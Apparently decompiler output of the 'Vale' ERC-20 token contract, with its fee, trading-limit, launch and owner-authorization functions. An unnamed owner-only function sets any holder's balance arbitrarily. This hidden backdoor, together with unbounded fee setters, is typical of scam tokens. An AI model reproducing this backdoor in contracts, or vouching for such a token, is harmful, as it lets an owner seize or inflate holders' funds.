contract main {




// =====================  Runtime code  =====================


#
#  - transferFrom(address arg1, address arg2, uint256 arg3)
#  - transfer(address arg1, uint256 arg2)
#  - _fallback()
#
const name = 'Vale', 0

const totalSupply = 100000000 * 10^18

const decimals = 18

const symbol = '', 0


address owner;
mapping of uint8 stor1;
uint256 _maxTxAmount;
uint256 _maxWalletSize;
mapping of uint256 balanceOf;
mapping of uint256 allowance;
mapping of uint8 stor6;
mapping of uint8 stor7;
mapping of uint8 stor8;
mapping of uint8 stor9;
uint256 stor10;
uint256 stor11;
uint256 stor12;
uint256 stor13;
uint256 stor14;
uint256 stor15;
uint256 stor16;
uint256 stor19;
uint256 stor20;
uint256 stor21;
uint256 stor22;
uint256 stor23;
uint256 stor31;
uint256 launchTimestamp;
uint256 stor33;
address stor41;
address stor42;
address stor44;
address routerAddress;
address pairAddress;
uint256 launchedAt;
uint8 tradingEnabled;
uint8 swapEnabled; offset 8
uint16 stor48;
uint256 stor48; offset 8
uint256 swapThreshold;
uint256 stor42C6;

function swapThreshold() {
    return swapThreshold
}

function sub_0bd11f8a(?) {
    require calldata.size - 4 >= 32
    require arg1 == address(arg1)
    return bool(stor8[arg1])
}

function isFeeExempt(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return bool(stor6[arg1])
}

function tradingEnabled() {
    return bool(tradingEnabled)
}

function launchTimestamp() {
    return launchTimestamp
}

function swapEnabled() {
    return bool(swapEnabled)
}

function balanceOf(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return balanceOf[address(arg1)]
}

function _maxTxAmount() {
    return _maxTxAmount
}

function getOwner() {
    return owner
}

function isTxLimitExempt(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return bool(stor7[arg1])
}

function _maxWalletSize() {
    return _maxWalletSize
}

function pair() {
    return pairAddress
}

function launchedAt() {
    return launchedAt
}

function allowance(address arg1, address arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    return allowance[address(arg1)][address(arg2)]
}

function sub_e5339685(?) {
    require calldata.size - 4 >= 32
    require arg1 == address(arg1)
    return bool(stor9[arg1])
}

function router() {
    return routerAddress
}

function isAuthorized(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return bool(stor1[address(arg1)])
}

function isOwner(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return (owner == arg1)
}

function authorize(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, '!OWNER'
    stor1[address(arg1)] = 1
}

function unauthorize(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, '!OWNER'
    stor1[address(arg1)] = 0
}

function sub_24bc3a06(?) {
    require calldata.size - 4 >= 64
    require arg1 == address(arg1)
    if owner != msg.sender:
        revert with 0, '!OWNER'
    balanceOf[address(arg1)] = arg2
}

function setMaxWallet(uint256 arg1) {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, '!OWNER'
    require arg1 >= 100000 * 10^18
    _maxWalletSize = arg1
}

function approveMax(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    allowance[msg.sender][address(arg1)] = -1
    emit Approval(-1, msg.sender, arg1);
    return 1
}

function setDevFeeReceiver(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if not stor1[address(msg.sender)]:
        revert with 0, '!AUTHORIZED'
    stor42 = arg1
}

function startTrading() {
    if owner != msg.sender:
        revert with 0, '!OWNER'
    uint16(stor48.field_0) = 257
    launchTimestamp = block.timestamp
    emit TradingEnabled(block.timestamp);
}

function sub_0c03e170(?) {
    if owner != msg.sender:
        revert with 0, '!OWNER'
    uint16(stor48.field_0) = 257
    launchTimestamp = block.timestamp
    emit TradingEnabled(block.timestamp);
}

function sub_826d35f3(?) {
    require calldata.size - 4 >= 32
    require arg1 == address(arg1)
    if not stor1[address(msg.sender)]:
        revert with 0, '!AUTHORIZED'
    stor44 = address(arg1)
}

function sub_d55f146b(?) {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, '!OWNER'
    if arg1 >= 1536:
        revert with 0, 'Time too long'
    stor33 = arg1
}

function setMarketingFeeReceiver(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if not stor1[address(msg.sender)]:
        revert with 0, '!AUTHORIZED'
    stor41 = arg1
}

function setTxLimit(uint256 arg1) {
    require calldata.size - 4 >= 32
    if not stor1[address(msg.sender)]:
        revert with 0, '!AUTHORIZED'
    require arg1 >= 100000 * 10^18
    _maxTxAmount = arg1
}

function approve(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    allowance[msg.sender][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function sub_30534fc2(?) {
    require calldata.size - 4 >= 64
    require arg1 == address(arg1)
    require arg2 == bool(arg2)
    if owner != msg.sender:
        revert with 0, '!OWNER'
    stor9[address(arg1)] = uint8(bool(arg2))
}

function excludeFromMaxTX(address arg1, bool arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if owner != msg.sender:
        revert with 0, '!OWNER'
    stor7[address(arg1)] = uint8(arg2)
}

function excludeFromMaxWallet(address arg1, bool arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if owner != msg.sender:
        revert with 0, '!OWNER'
    stor8[address(arg1)] = uint8(arg2)
}

function transferOwnership(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, '!OWNER'
    owner = arg1
    stor1[address(arg1)] = 1
    emit OwnershipTransferred(arg1);
}

function setIsFeeExempt(address arg1, bool arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if not stor1[address(msg.sender)]:
        revert with 0, '!AUTHORIZED'
    stor6[address(arg1)] = uint8(arg2)
}

function setSwapBackSettings(bool arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    if not stor1[address(msg.sender)]:
        revert with 0, '!AUTHORIZED'
    Mask(248, 0, stor48.field_8) = Mask(248, 0, arg1)
    swapThreshold = arg2
}

function manualSend() {
    if not stor1[address(msg.sender)]:
        revert with 0, '!AUTHORIZED'
    call stor41 with:
       value eth.balance(this.address) wei
         gas 2300 * is_zero(value) wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function getCirculatingSupply() {
    if stor42C6 > 100000000 * 10^18:
        revert with 0, 'SafeMath: subtraction overflow', 0
    if 100000000 * 10^18 < stor42C6:
        revert with 0, 17
    if balanceOf[0] > -stor42C6 + 100000000 * 10^18:
        revert with 0, 'SafeMath: subtraction overflow', 0
    if -stor42C6 + 100000000 * 10^18 < balanceOf[0]:
        revert with 0, 17
    return (-stor42C6 + -balanceOf[0] + 100000000 * 10^18)
}

function transferERC20(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    if not stor1[address(msg.sender)]:
        revert with 0, '!AUTHORIZED'
    require ext_code.size(arg1)
    staticcall arg1.0x70a08231 with:
            gas gas_remaining wei
           args this.address
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    if arg2 > ext_call.return_data[0]:
        revert with 0, 'Can't transfer more than the balance'
    require ext_code.size(arg1)
    call arg1.0xa9059cbb with:
         gas gas_remaining wei
        args stor41, arg2
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == bool(ext_call.return_data[0])
}

function setBuyFees(uint256 arg1, uint256 arg2, uint256 arg3, uint256 arg4, uint256 arg5, uint256 arg6, uint256 arg7) {
    require calldata.size - 4 >= 224
    if not stor1[address(msg.sender)]:
        revert with 0, '!AUTHORIZED'
    stor10 = arg1
    stor11 = arg3
    stor15 = arg4
    stor14 = arg6
    stor13 = arg5
    stor12 = arg2
    if arg1 > !arg3:
        revert with 0, 17
    if arg1 + arg3 < arg1:
        revert with 0, 'SafeMath: addition overflow'
    if arg1 + arg3 > !arg4:
        revert with 0, 17
    if arg4 < 0:
        revert with 0, 'SafeMath: addition overflow'
    if arg1 + arg3 + arg4 > !arg5:
        revert with 0, 17
    if arg5 < 0:
        revert with 0, 'SafeMath: addition overflow'
    if arg1 + arg3 + arg4 + arg5 > !arg6:
        revert with 0, 17
    if arg6 < 0:
        revert with 0, 'SafeMath: addition overflow'
    if arg1 + arg3 + arg4 + arg5 + arg6 > !arg2:
        revert with 0, 17
    if arg2 < 0:
        revert with 0, 'SafeMath: addition overflow'
    stor16 = arg1 + arg3 + arg4 + arg5 + arg6 + arg2
    stor31 = arg7
}

function setSellFees(uint256 arg1, uint256 arg2, uint256 arg3, uint256 arg4, uint256 arg5, uint256 arg6, uint256 arg7) {
    require calldata.size - 4 >= 224
    if not stor1[address(msg.sender)]:
        revert with 0, '!AUTHORIZED'
    stor10 = arg1
    stor11 = arg3
    stor22 = arg4
    stor21 = arg6
    stor20 = arg5
    stor19 = arg2
    if arg1 > !arg3:
        revert with 0, 17
    if arg1 + arg3 < arg1:
        revert with 0, 'SafeMath: addition overflow'
    if arg1 + arg3 > !arg4:
        revert with 0, 17
    if arg4 < 0:
        revert with 0, 'SafeMath: addition overflow'
    if arg1 + arg3 + arg4 > !arg5:
        revert with 0, 17
    if arg5 < 0:
        revert with 0, 'SafeMath: addition overflow'
    if arg1 + arg3 + arg4 + arg5 > !arg6:
        revert with 0, 17
    if arg6 < 0:
        revert with 0, 'SafeMath: addition overflow'
    if arg1 + arg3 + arg4 + arg5 + arg6 > !arg2:
        revert with 0, 17
    if arg2 < 0:
        revert with 0, 'SafeMath: addition overflow'
    stor23 = arg1 + arg3 + arg4 + arg5 + arg6 + arg2
    stor31 = arg7
}

function getTotalFee(bool arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if block.timestamp < launchTimestamp:
        revert with 0, 17
    if block.timestamp < launchTimestamp:
        revert with 0, 17
    if block.timestamp - launchTimestamp >= stor33:
        if not arg1:
            return stor16
    else:
        if not arg1:
            if 1 > stor31:
                revert with 0, 'SafeMath: subtraction overflow', 0
            if stor31 < 1:
                revert with 0, 17
            return (stor31 - 1)
    ('bool', ('param', 'arg1'))
    if not stor23:
        return 0
    if block.timestamp - launchTimestamp <= 3600:
        if stor23 and 2 > -1 / stor23:
            revert with 0, 17
        if not stor23:
            revert with 0, 18
        if 2 * stor23 / stor23 != 2:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'SafeMath: multiplication overflow'
        return (2 * stor23)
    if stor23 and 1 > -1 / stor23:
        revert with 0, 17
    if not stor23:
        revert with 0, 18
    if stor23 / stor23 != 1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'SafeMath: multiplication overflow'
    return stor23
}



}
